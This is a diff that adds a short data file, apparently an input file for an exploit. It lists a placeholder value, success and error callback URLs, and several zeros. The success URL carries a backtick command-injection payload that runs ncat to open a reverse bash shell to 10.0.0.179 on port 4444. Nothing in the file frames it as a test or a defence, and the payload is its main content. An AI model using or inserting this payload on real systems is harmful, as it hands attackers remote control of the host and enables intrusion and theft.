@@ -1,0 +1,7 @@
+AAA
+https://localhost/success`ncat -e /bin/bash 10.0.0.179 4444`
+https://localhost/error
+0
+0
+0
+0
